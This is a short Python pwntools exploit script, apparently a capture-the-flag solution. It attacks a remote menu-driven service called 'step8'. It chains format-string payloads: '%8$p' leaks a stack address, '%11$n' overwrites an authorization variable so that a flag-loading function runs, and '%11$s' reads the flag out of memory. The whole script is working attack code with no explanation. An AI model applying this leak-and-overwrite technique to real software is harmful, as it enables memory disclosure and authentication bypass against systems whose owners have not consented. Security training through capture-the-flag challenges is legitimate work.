
from binascii import hexlify, unhexlify
from pwn import *

def retLittleEnd(stin):
    return stin[10:12] + stin[8:10]+stin[6:8] + stin[4:6] + stin[2:4] + stin[0:2]

authorizeAddr2 = "2cddffffff7f0000"
flagAddr = '8022600000000000'
#p = process('./step8')
p = remote( "dumbistan.life", 50080)

sleep(0.1)
p.sendline('3')
sleep(0.1)

myname =  'AA' + '%8$p' +unhexlify(authorizeAddr2)

print len(myname)

sleep(0.1)
p.sendline(myname)
sleep(0.2)
p.sendline('4')
sleep(0.8)  #fukin races conditions

rec =  p.recv()
print "now comes parsed^^"
tmp = rec[-29:-17]
val = int(tmp, base=16)
authorizeAddr = struct.pack("<Q", val-4)
print hexlify(authorizeAddr)

p.sendline('3')
sleep(0.2)

myname =  'AAA' + '%11$n' +(authorizeAddr)
p.sendline(myname)
sleep(0.1)
p.sendline('4')

p.sendline('1')
sleep(0.2)
print p.recv()

######################################################################################
#until here, load_flag() was executed :)
######################################################################################
p.sendline('3')
sleep(0.2)

myname =  'AAA' + '%11$s' +unhexlify(flagAddr)

print len(myname)

p.sendline(myname)
sleep(0.2)

p.sendline('4')
sleep(0.8)
print p.recv()